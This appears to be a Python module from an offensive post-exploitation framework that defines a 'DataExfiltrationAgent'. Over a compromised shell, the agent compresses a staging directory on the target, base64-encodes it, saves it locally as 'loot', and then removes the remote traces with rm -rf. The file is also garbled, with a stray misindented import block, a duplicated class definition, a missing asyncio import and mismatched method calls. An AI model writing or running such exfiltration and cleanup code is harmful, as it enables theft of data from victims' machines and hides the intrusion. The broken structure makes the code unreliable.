"""
An agent that exfiltrates staged data from a target machine back to the C2 server.
"""

import os
from core.data_models import AgentData, Strategy
import base64
from datetime import datetime, timezone
from core.logger import log
from core.data_models import Strategy, DataExfiltrationReport, AttackPhase
from core.target_model_manager import TargetModel
from typing import Optional
from core.shell_manager import ShellManager
from core.target_model_manager import TargetModelManager

from core.base_agent import BaseAgent


class DataExfiltrationAgent(BaseAgent):
    supported_phases = [AttackPhase.ESCALATION]
    required_tools = ["curl"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.loot_dir = os.path.abspath("loot")

    async def setup(self):
        """Asynchronous setup method for DataExfiltrationAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')

    import os
import base64
from datetime import datetime, timezone
from core.logger import log
from core.data_models import Strategy, DataExfiltrationReport, AttackPhase, ErrorType
from core.target_model_manager import TargetModel
from typing import Optional
from core.shell_manager import ShellManager
from core.target_model_manager import TargetModelManager
import time

from core.base_agent import BaseAgent

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute data exfiltration agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )


class DataExfiltrationAgent(BaseAgent):
    supported_phases = [AttackPhase.ESCALATION]
    required_tools = ["curl"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.loot_dir = os.path.abspath("loot")
        self.report_class = DataExfiltrationReport # Set report class

    async def setup(self):
        """Asynchronous setup method for DataExfiltrationAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')

    async def run(self, strategy: Strategy, **kwargs) -> DataExfiltrationReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        staging_directory = strategy.context.get("staging_directory")

        if not all([shell_id, staging_directory]):
            end_time = time.time()
            return DataExfiltrationReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["Shell ID or staging directory not provided."],
                error_type=ErrorType.CONFIGURATION,
                summary="Data exfiltration failed: Missing shell ID or staging directory."
            )

        log.phase(
            f"DataExfiltrationAgent: Exfiltrating data from {staging_directory} on shell {shell_id}")
        os.makedirs(self.loot_dir, exist_ok=True)

        remote_archive_path = f"/tmp/loot_{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}.tar.gz"

        try:
            # 1. Compress the staging directory
            compress_command = f"tar -czf {remote_archive_path} -C {staging_directory} ."
            log.info(
                f"Compressing loot directory with command: {compress_command}")
            await self.shell_manager.send_command(shell_id, compress_command, timeout=300)

            # 2. Base64 encode and exfiltrate the data
            exfil_command = f"base64 {remote_archive_path}"
            log.info(f"Exfiltrating data with command: {exfil_command}")
            base64_data = await self.shell_manager.send_command(shell_id, exfil_command, timeout=300)

            if not base64_data or "not found" in base64_data:
                raise Exception(
                    f"Failed to get base64 data from target: {base64_data}")

            # 3. Decode and save the loot locally
            decoded_data = base64.b64decode(base64_data)
            timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            local_loot_filename = f"loot_{shell_id.replace('-', '')}_{timestamp}.tar.gz"
            local_loot_path = os.path.join(self.loot_dir, local_loot_filename)

            with open(local_loot_path, "wb") as f:
                f.write(decoded_data)

            file_size = len(decoded_data)
            log.success(
                f"Successfully exfiltrated and saved {file_size} bytes to {local_loot_path}")

            # Update the target model
            target_model = self.target_model_manager.get_target(
                strategy.context.get("hostname"))
            if target_model:
                target_model.data_exfiltrated = True
                self.target_model_manager.save_model(target_model)

            end_time = time.time()
            return DataExfiltrationReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                exfiltrated_file_path=local_loot_path,
                file_size=file_size,
                summary=f"Successfully exfiltrated loot to {local_loot_path}"
            )

        except Exception as e:
            log.error(f"Data exfiltration failed: {e}")
            end_time = time.time()
            return DataExfiltrationReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=[str(e)],
                error_type=ErrorType.LOGIC,
                summary=f"Data exfiltration failed: {e}"
            )
        finally:
            # 4. Clean up remote files
            log.info("Cleaning up remote staging directory and archive...")
            await self.shell_manager.send_command(shell_id, f"rm -rf {staging_directory}", timeout=60)
            await self.shell_manager.send_command(shell_id, f"rm {remote_archive_path}", timeout=60)
